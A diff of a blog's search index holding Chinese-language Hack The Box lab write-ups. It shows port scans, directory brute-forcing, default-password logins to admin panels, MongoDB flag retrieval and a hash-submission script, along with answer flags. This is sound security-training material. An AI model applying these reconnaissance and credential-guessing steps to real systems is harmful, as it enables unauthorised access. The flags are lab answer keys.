@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>HTB-ArcheType</title>
-    <url>/2023/06/05/HTB-ArcheType/</url>
+    <url>/HTB-ArcheType.html</url>
     <content><![CDATA[<h5 id="一、哪一个TCP端口托管数据库服务器？"><a href="#一、哪一个TCP端口托管数据库服务器？" class="headerlink" title="一、哪一个TCP端口托管数据库服务器？"></a>一、哪一个TCP端口托管数据库服务器？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV  10.129.186.174</span><br><span class="line">namp -sV -sC 10.129.186.174</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2023/03/12/UafI9PnGM3T8Zk1.png" alt="image-20230209095638512"></p>
@@ -72,7 +72,7 @@
   </entry>
   <entry>
     <title>HTB-Base</title>
-    <url>/2023/07/06/HTB-Base/</url>
+    <url>/HTB-Base.html</url>
     <content><![CDATA[<h5 id="一、远程主机上开放的端口是什么？"><a href="#一、远程主机上开放的端口是什么？" class="headerlink" title="一、远程主机上开放的端口是什么？"></a>一、远程主机上开放的端口是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用nmap进行扫描</span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">22,80</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2023/03/23/wPLgEBFHlpWM12Y.png" alt="image-20230321104936010"></p>
@@ -124,7 +124,7 @@
   </entry>
   <entry>
     <title>HTB-Bike</title>
-    <url>/2023/07/06/HTB-Bike/</url>
+    <url>/HTB-Bike.html</url>
     <content><![CDATA[<h5 id="一、nmap-将哪些-TCP-端口标识为打开？从低到高，英文逗号隔开"><a href="#一、nmap-将哪些-TCP-端口标识为打开？从低到高，英文逗号隔开" class="headerlink" title="一、nmap 将哪些 TCP 端口标识为打开？从低到高，英文逗号隔开"></a>一、nmap 将哪些 TCP 端口标识为打开？从低到高，英文逗号隔开</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap扫描目标IP</span></span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">22,80</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2023/03/13/NjoC9aiKtYnOgFk.png" alt="image-20230313104132830"></p>
@@ -173,8 +173,33 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Emdee five for life</title>
+    <url>/HTB-Emdee%20five%20for%20life.html</url>
+    <content><![CDATA[<h5 id="访问靶机地址"><a href="#访问靶机地址" class="headerlink" title="访问靶机地址"></a>访问靶机地址</h5><p><img src="https://s2.loli.net/2023/04/25/aEwWOZqpAk4MiuU.png" alt="image-20230421172531319"></p>
+<h5 id="题目提示是使用MD5加密字符串，提交后显示速度太慢"><a href="#题目提示是使用MD5加密字符串，提交后显示速度太慢" class="headerlink" title="题目提示是使用MD5加密字符串，提交后显示速度太慢"></a>题目提示是使用MD5加密字符串，提交后显示速度太慢</h5><p>解题思路，使用python脚本代替手工提交</p>
+<ul>
+<li>获取网页中的string字符串</li>
+<li>MD5加密字符串</li>
+<li>提交加密后的数据</li>
+</ul>
+<h5 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@author ZPast0r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> selectolax.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="comment"># 网站地址</span></span><br><span class="line">url = <span class="string">&#x27;http://161.35.36.167:32078&#x27;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">html = r.get(url)</span><br><span class="line">text = html.text</span><br><span class="line">tree = HTMLParser(text)</span><br><span class="line"><span class="keyword">for</span> node  <span class="keyword">in</span> tree.css(<span class="string">&quot;h3&quot;</span>):</span><br><span class="line">    MD5 = node.text(strip=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(MD5)</span><br><span class="line">final = hashlib.md5(MD5.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">data = &#123;<span class="string">&#x27;hash&#x27;</span>:final&#125;</span><br><span class="line">posthtml = r.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(posthtml.text)</span><br></pre></td></tr></table></figure>
+
+<h5 id="运行python脚本，得到flag"><a href="#运行python脚本，得到flag" class="headerlink" title="运行python脚本，得到flag"></a>运行python脚本，得到flag</h5><p><img src="https://s2.loli.net/2023/04/25/7IouOetkFxfhBN8.png" alt="image-20230421173053276"></p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
+<li>可以使用正则表达式提取flag字段</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>HTB</category>
+      </categories>
+      <tags>
+        <tag>HTB-Emdee five for life</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Funnel</title>
-    <url>/2023/07/06/HTB-Funnel/</url>
+    <url>/HTB-Funnel.html</url>
     <content><![CDATA[<h5 id="一、打开了多少个-TCP-端口？"><a href="#一、打开了多少个-TCP-端口？" class="headerlink" title="一、打开了多少个 TCP 端口？"></a>一、打开了多少个 TCP 端口？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap扫描IP</span></span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2023/03/13/J4AzfhgCrTS6bRt.png" alt="image-20230313153616428"></p>
@@ -210,33 +235,8 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB-Emdee five for life</title>
-    <url>/2023/07/06/HTB-Emdee%20five%20for%20life/</url>
-    <content><![CDATA[<h5 id="访问靶机地址"><a href="#访问靶机地址" class="headerlink" title="访问靶机地址"></a>访问靶机地址</h5><p><img src="https://s2.loli.net/2023/04/25/aEwWOZqpAk4MiuU.png" alt="image-20230421172531319"></p>
-<h5 id="题目提示是使用MD5加密字符串，提交后显示速度太慢"><a href="#题目提示是使用MD5加密字符串，提交后显示速度太慢" class="headerlink" title="题目提示是使用MD5加密字符串，提交后显示速度太慢"></a>题目提示是使用MD5加密字符串，提交后显示速度太慢</h5><p>解题思路，使用python脚本代替手工提交</p>
-<ul>
-<li>获取网页中的string字符串</li>
-<li>MD5加密字符串</li>
-<li>提交加密后的数据</li>
-</ul>
-<h5 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@author ZPast0r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> selectolax.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="comment"># 网站地址</span></span><br><span class="line">url = <span class="string">&#x27;http://161.35.36.167:32078&#x27;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">html = r.get(url)</span><br><span class="line">text = html.text</span><br><span class="line">tree = HTMLParser(text)</span><br><span class="line"><span class="keyword">for</span> node  <span class="keyword">in</span> tree.css(<span class="string">&quot;h3&quot;</span>):</span><br><span class="line">    MD5 = node.text(strip=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(MD5)</span><br><span class="line">final = hashlib.md5(MD5.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">data = &#123;<span class="string">&#x27;hash&#x27;</span>:final&#125;</span><br><span class="line">posthtml = r.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(posthtml.text)</span><br></pre></td></tr></table></figure>
-
-<h5 id="运行python脚本，得到flag"><a href="#运行python脚本，得到flag" class="headerlink" title="运行python脚本，得到flag"></a>运行python脚本，得到flag</h5><p><img src="https://s2.loli.net/2023/04/25/7IouOetkFxfhBN8.png" alt="image-20230421173053276"></p>
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
-<li>可以使用正则表达式提取flag字段</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>HTB</category>
-      </categories>
-      <tags>
-        <tag>HTB-Emdee five for life</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-Explosion</title>
-    <url>/2023/07/06/HTB-Explosion/</url>
+    <url>/HTB-Explosion.html</url>
     <content><![CDATA[<h5 id="一、RDP的全称是什么？"><a href="#一、RDP的全称是什么？" class="headerlink" title="一、RDP的全称是什么？"></a>一、RDP的全称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Remote Desktop Protocol</span><br></pre></td></tr></table></figure>
 
 <h5 id="二、通过命令行界面与主机进行交互的单词全称的3个首字母什么？"><a href="#二、通过命令行界面与主机进行交互的单词全称的3个首字母什么？" class="headerlink" title="二、通过命令行界面与主机进行交互的单词全称的3个首字母什么？"></a>二、通过命令行界面与主机进行交互的单词全称的3个首字母什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cli</span><br></pre></td></tr></table></figure>
@@ -268,7 +268,7 @@
   </entry>
   <entry>
     <title>HTB-Heist</title>
-    <url>/2023/07/06/HTB-Heist/</url>
+    <url>/HTB-Heist.html</url>
     <content><![CDATA[<h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><ul>
 <li><p>端口扫描</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sS -Pn -p- 10.129.96.157</span><br></pre></td></tr></table></figure>
@@ -461,42 +461,8 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB-Ignition</title>
-    <url>/2023/07/06/HTB-Ignition/</url>
-    <content><![CDATA[<h5 id="一、发现哪个服务版本在端口-80-上运行？"><a href="#一、发现哪个服务版本在端口-80-上运行？" class="headerlink" title="一、发现哪个服务版本在端口 80 上运行？"></a>一、发现哪个服务版本在端口 80 上运行？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap进行扫描</span></span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">nginx 1.14.2</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/12/d4Yo6wEsk1gQKIp.png" alt="image-20230310143400284"></p>
-<h5 id="二、访问-http-x2F-x2F-机器-IP-时返回的-3-位-HTTP-状态代码是什么？"><a href="#二、访问-http-x2F-x2F-机器-IP-时返回的-3-位-HTTP-状态代码是什么？" class="headerlink" title="二、访问 http:&#x2F;&#x2F;{机器 IP} 时返回的 3 位 HTTP 状态代码是什么？"></a>二、访问 http:&#x2F;&#x2F;{机器 IP} 时返回的 3 位 HTTP 状态代码是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用curl -v http://IP</span></span><br><span class="line">curl -v http://IP</span><br><span class="line">302</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/12/RIlv3h5fewHXtJx.png" alt="image-20230310143807830"></p>
-<h5 id="三、网页希望通过什么虚拟主机名访问？"><a href="#三、网页希望通过什么虚拟主机名访问？" class="headerlink" title="三、网页希望通过什么虚拟主机名访问？"></a>三、网页希望通过什么虚拟主机名访问？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ignition.HTB</span><br></pre></td></tr></table></figure>
-
-<h5 id="四、Linux-计算机上保存域名到-IP-地址对的本地列表的文件的完整路径是什么？"><a href="#四、Linux-计算机上保存域名到-IP-地址对的本地列表的文件的完整路径是什么？" class="headerlink" title="四、Linux 计算机上保存域名到 IP 地址对的本地列表的文件的完整路径是什么？"></a>四、Linux 计算机上保存域名到 IP 地址对的本地列表的文件的完整路径是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>
-
-<h5 id="五、使用工具暴力破解-Web-服务器上的目录。Magento登录页面的完整URL是什么？"><a href="#五、使用工具暴力破解-Web-服务器上的目录。Magento登录页面的完整URL是什么？" class="headerlink" title="五、使用工具暴力破解 Web 服务器上的目录。Magento登录页面的完整URL是什么？"></a>五、使用工具暴力破解 Web 服务器上的目录。Magento登录页面的完整URL是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用gobuster进行目录爆破</span></span><br><span class="line">gobuster dir http://ignition.HTB -w /usr/share/wordlist/dirb/comment.txt</span><br><span class="line">http://ignition.HTB/admin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/12/1Ygwe9GDVo3UHcL.png" alt="image-20230310150624992"></p>
-<h5 id="六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？"><a href="#六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？" class="headerlink" title="六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？"></a>六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用burp进行爆破，有防御措施</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">弱密码地址</span></span><br><span class="line">https://nordpass.com/most-common-passwords-list/</span><br><span class="line">Admin/qwerty123</span><br></pre></td></tr></table></figure>
-
-<h5 id="七、提交flag"><a href="#七、提交flag" class="headerlink" title="七、提交flag"></a>七、提交flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">797d6c988d9dc5865e010b9410f247e0</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/12/dC8T25HVBMbIKPL.png" alt="image-20230310154900055"></p>
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
-<li><p>curl的用法</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看应用返回的状态码</span></span><br><span class="line">curl -v http://IP/</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>HTB</category>
-      </categories>
-      <tags>
-        <tag>HTB-Ignition</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-Included</title>
-    <url>/2023/07/06/HTB-Included/</url>
+    <url>/HTB-Included.html</url>
     <content><![CDATA[<h5 id="一、-目标计算机上通过-UDP运行什么服务？"><a href="#一、-目标计算机上通过-UDP运行什么服务？" class="headerlink" title="一、 目标计算机上通过 UDP运行什么服务？"></a>一、 目标计算机上通过 UDP运行什么服务？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">nmpa -sU IP</span><br><span class="line">tftp</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2023/03/23/a1mhGTJAU7df4ur.png" alt="image-20230316111033677"></p>
@@ -546,8 +512,42 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Ignition</title>
+    <url>/HTB-Ignition.html</url>
+    <content><![CDATA[<h5 id="一、发现哪个服务版本在端口-80-上运行？"><a href="#一、发现哪个服务版本在端口-80-上运行？" class="headerlink" title="一、发现哪个服务版本在端口 80 上运行？"></a>一、发现哪个服务版本在端口 80 上运行？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap进行扫描</span></span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">nginx 1.14.2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/12/d4Yo6wEsk1gQKIp.png" alt="image-20230310143400284"></p>
+<h5 id="二、访问-http-x2F-x2F-机器-IP-时返回的-3-位-HTTP-状态代码是什么？"><a href="#二、访问-http-x2F-x2F-机器-IP-时返回的-3-位-HTTP-状态代码是什么？" class="headerlink" title="二、访问 http:&#x2F;&#x2F;{机器 IP} 时返回的 3 位 HTTP 状态代码是什么？"></a>二、访问 http:&#x2F;&#x2F;{机器 IP} 时返回的 3 位 HTTP 状态代码是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用curl -v http://IP</span></span><br><span class="line">curl -v http://IP</span><br><span class="line">302</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/12/RIlv3h5fewHXtJx.png" alt="image-20230310143807830"></p>
+<h5 id="三、网页希望通过什么虚拟主机名访问？"><a href="#三、网页希望通过什么虚拟主机名访问？" class="headerlink" title="三、网页希望通过什么虚拟主机名访问？"></a>三、网页希望通过什么虚拟主机名访问？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ignition.HTB</span><br></pre></td></tr></table></figure>
+
+<h5 id="四、Linux-计算机上保存域名到-IP-地址对的本地列表的文件的完整路径是什么？"><a href="#四、Linux-计算机上保存域名到-IP-地址对的本地列表的文件的完整路径是什么？" class="headerlink" title="四、Linux 计算机上保存域名到 IP 地址对的本地列表的文件的完整路径是什么？"></a>四、Linux 计算机上保存域名到 IP 地址对的本地列表的文件的完整路径是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>
+
+<h5 id="五、使用工具暴力破解-Web-服务器上的目录。Magento登录页面的完整URL是什么？"><a href="#五、使用工具暴力破解-Web-服务器上的目录。Magento登录页面的完整URL是什么？" class="headerlink" title="五、使用工具暴力破解 Web 服务器上的目录。Magento登录页面的完整URL是什么？"></a>五、使用工具暴力破解 Web 服务器上的目录。Magento登录页面的完整URL是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用gobuster进行目录爆破</span></span><br><span class="line">gobuster dir http://ignition.HTB -w /usr/share/wordlist/dirb/comment.txt</span><br><span class="line">http://ignition.HTB/admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/12/1Ygwe9GDVo3UHcL.png" alt="image-20230310150624992"></p>
+<h5 id="六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？"><a href="#六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？" class="headerlink" title="六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？"></a>六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用burp进行爆破，有防御措施</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">弱密码地址</span></span><br><span class="line">https://nordpass.com/most-common-passwords-list/</span><br><span class="line">Admin/qwerty123</span><br></pre></td></tr></table></figure>
+
+<h5 id="七、提交flag"><a href="#七、提交flag" class="headerlink" title="七、提交flag"></a>七、提交flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">797d6c988d9dc5865e010b9410f247e0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/12/dC8T25HVBMbIKPL.png" alt="image-20230310154900055"></p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
+<li><p>curl的用法</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看应用返回的状态码</span></span><br><span class="line">curl -v http://IP/</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>HTB</category>
+      </categories>
+      <tags>
+        <tag>HTB-Ignition</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Markup</title>
-    <url>/2023/07/06/HTB-Markup/</url>
+    <url>/HTB-Markup.html</url>
     <content><![CDATA[<h5 id="一、目标端口-80-上运行的是什么版本的-Apache？"><a href="#一、目标端口-80-上运行的是什么版本的-Apache？" class="headerlink" title="一、目标端口 80 上运行的是什么版本的 Apache？"></a>一、目标端口 80 上运行的是什么版本的 Apache？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用nmap扫描IP</span><br><span class="line">nmap -sC -sV IP</span><br><span class="line">2.4.41</span><br></pre></td></tr></table></figure>
 
 <h5 id="二、什么用户名：密码组合登录成功？"><a href="#二、什么用户名：密码组合登录成功？" class="headerlink" title="二、什么用户名：密码组合登录成功？"></a>二、什么用户名：密码组合登录成功？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用burp抓包进行爆破</span><br><span class="line">admin:password</span><br></pre></td></tr></table></figure>
@@ -591,41 +591,8 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB-Mongod</title>
-    <url>/2023/07/06/HTB-Mongod/</url>
-    <content><![CDATA[<h5 id="一、计算机上打开了多少个-TCP-端口？"><a href="#一、计算机上打开了多少个-TCP-端口？" class="headerlink" title="一、计算机上打开了多少个 TCP 端口？"></a>一、计算机上打开了多少个 TCP 端口？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap进行扫描</span></span><br><span class="line">nmap -sV IP</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
-
-<h5 id="二、远程主机的端口-27017-上运行哪个服务？"><a href="#二、远程主机的端口-27017-上运行哪个服务？" class="headerlink" title="二、远程主机的端口 27017 上运行哪个服务？"></a>二、远程主机的端口 27017 上运行哪个服务？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描指定端口27017</span></span><br><span class="line">nmap -sV -p 27017 IP</span><br></pre></td></tr></table></figure>
-
-<h5 id="三、MongoDB是什么类型的数据库？（选择：SQL-或-NoSQL）"><a href="#三、MongoDB是什么类型的数据库？（选择：SQL-或-NoSQL）" class="headerlink" title="三、MongoDB是什么类型的数据库？（选择：SQL 或 NoSQL）"></a>三、MongoDB是什么类型的数据库？（选择：SQL 或 NoSQL）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NoSQL</span><br></pre></td></tr></table></figure>
-
-<h5 id="五、与-mongodb-clients-软件包一起安装的-Mongo-shell-的命令名称是什么？"><a href="#五、与-mongodb-clients-软件包一起安装的-Mongo-shell-的命令名称是什么？" class="headerlink" title="五、与 mongodb-clients 软件包一起安装的 Mongo shell 的命令名称是什么？"></a>五、与 mongodb-clients 软件包一起安装的 Mongo shell 的命令名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mongo</span><br></pre></td></tr></table></figure>
-
-<h5 id="六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随"><a href="#六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随" class="headerlink" title="六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随;)"></a>六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随;)</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure>
-
-<h5 id="七、用于列出数据库中集合的命令是什么？（无需包含尾随"><a href="#七、用于列出数据库中集合的命令是什么？（无需包含尾随" class="headerlink" title="七、用于列出数据库中集合的命令是什么？（无需包含尾随;)"></a>七、用于列出数据库中集合的命令是什么？（无需包含尾随;)</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> collections</span><br></pre></td></tr></table></figure>
-
-<h5 id="八、用于以易于阅读的格式转储名为-flag-的集合中所有文档的内容的命令是什么？"><a href="#八、用于以易于阅读的格式转储名为-flag-的集合中所有文档的内容的命令是什么？" class="headerlink" title="八、用于以易于阅读的格式转储名为 flag 的集合中所有文档的内容的命令是什么？"></a>八、用于以易于阅读的格式转储名为 flag 的集合中所有文档的内容的命令是什么？</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#链接mongoDB</span><br><span class="line">mongo IP</span><br><span class="line">#切换到sensitive_information数据库</span><br><span class="line">use sensitive_information</span><br><span class="line">#列出数据库中的集合</span><br><span class="line"><span class="keyword">show</span> collections</span><br><span class="line">#列出flag集合的内容</span><br><span class="line">db.flag.find().pretty()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/11/VQaAGWXT8FbNLCZ.png" alt="image-20230309233854675"></p>
-<h5 id="九、提交flag"><a href="#九、提交flag" class="headerlink" title="九、提交flag"></a>九、提交flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1b6e6fb359e7c40241b6d431427ba6ea</span><br></pre></td></tr></table></figure>
-
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
-<li><p>MongoDB数据库的操作指令</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#列出所有数据库</span><br><span class="line"><span class="keyword">show</span> dbs</span><br><span class="line">#使用特定数据库</span><br><span class="line">use DBName</span><br><span class="line">#列出所有集合</span><br><span class="line"><span class="keyword">show</span> collections</span><br><span class="line">#展示集合中的数据</span><br><span class="line">db.COLname.find().pretty</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>HTB</category>
-      </categories>
-      <tags>
-        <tag>HTB-Mongod</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-Netmon</title>
-    <url>/2023/07/06/HTB-Netmon/</url>
+    <url>/HTB-Netmon.html</url>
     <content><![CDATA[<h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>使用nmap对靶机IP进行扫描，目标开放21，80，135，139，445，操作系统为Windows Server</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC 10.129.248.153</span><br></pre></td></tr></table></figure>
 
@@ -677,8 +644,41 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Mongod</title>
+    <url>/HTB-Mongod.html</url>
+    <content><![CDATA[<h5 id="一、计算机上打开了多少个-TCP-端口？"><a href="#一、计算机上打开了多少个-TCP-端口？" class="headerlink" title="一、计算机上打开了多少个 TCP 端口？"></a>一、计算机上打开了多少个 TCP 端口？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap进行扫描</span></span><br><span class="line">nmap -sV IP</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<h5 id="二、远程主机的端口-27017-上运行哪个服务？"><a href="#二、远程主机的端口-27017-上运行哪个服务？" class="headerlink" title="二、远程主机的端口 27017 上运行哪个服务？"></a>二、远程主机的端口 27017 上运行哪个服务？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描指定端口27017</span></span><br><span class="line">nmap -sV -p 27017 IP</span><br></pre></td></tr></table></figure>
+
+<h5 id="三、MongoDB是什么类型的数据库？（选择：SQL-或-NoSQL）"><a href="#三、MongoDB是什么类型的数据库？（选择：SQL-或-NoSQL）" class="headerlink" title="三、MongoDB是什么类型的数据库？（选择：SQL 或 NoSQL）"></a>三、MongoDB是什么类型的数据库？（选择：SQL 或 NoSQL）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NoSQL</span><br></pre></td></tr></table></figure>
+
+<h5 id="五、与-mongodb-clients-软件包一起安装的-Mongo-shell-的命令名称是什么？"><a href="#五、与-mongodb-clients-软件包一起安装的-Mongo-shell-的命令名称是什么？" class="headerlink" title="五、与 mongodb-clients 软件包一起安装的 Mongo shell 的命令名称是什么？"></a>五、与 mongodb-clients 软件包一起安装的 Mongo shell 的命令名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mongo</span><br></pre></td></tr></table></figure>
+
+<h5 id="六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随"><a href="#六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随" class="headerlink" title="六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随;)"></a>六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随;)</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure>
+
+<h5 id="七、用于列出数据库中集合的命令是什么？（无需包含尾随"><a href="#七、用于列出数据库中集合的命令是什么？（无需包含尾随" class="headerlink" title="七、用于列出数据库中集合的命令是什么？（无需包含尾随;)"></a>七、用于列出数据库中集合的命令是什么？（无需包含尾随;)</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> collections</span><br></pre></td></tr></table></figure>
+
